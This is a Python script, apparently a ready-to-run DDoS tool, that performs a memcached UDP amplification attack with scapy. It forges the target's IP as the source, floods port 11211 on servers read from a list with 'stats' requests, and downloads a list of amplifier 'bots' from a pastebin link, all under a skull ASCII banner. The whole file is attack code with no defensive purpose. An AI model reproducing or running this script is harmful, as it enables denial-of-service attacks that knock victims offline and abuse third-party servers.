import pip
#pip.main(['install', 'scapy'])
#pip.main(['install', 'datetime'])
from scapy.all import *
import threading, sys, datetime, argparse, urllib2

print("""

                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~

	""")
print(datetime.datetime.now())

parser = argparse.ArgumentParser()
parser.add_argument("-T", help="Target")
parser.add_argument("-S", help="File amplification")
parser.add_argument("-P", default=40, help="Number of packages")
args = parser.parse_args()

def sends():
	global target
	global powers
	global servers
	data = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
	packet = send(IP(dst=servers, src=target)/UDP(dport=11211)/Raw(load=data), count=int(powers))


def attack():
	ampl = open(server)
	for servers in ampl.xreadlines(): 
		servers = servers.rstrip('\r\n')
		sends()

req = urllib2.urlopen('https://pastebin.com/raw/eSCHTTVu')
f = open('bot.txt', 'w')
print('Bots are uploaded to the bot.txt file')
f.write(req.read())
f.close()


target = args.T
server = args.S
powers = args.P
servers = ''

if (len(sys.argv) < 2) or (target == None) or (server == None):
	print('You run the script without parameters')
else:
	attack()
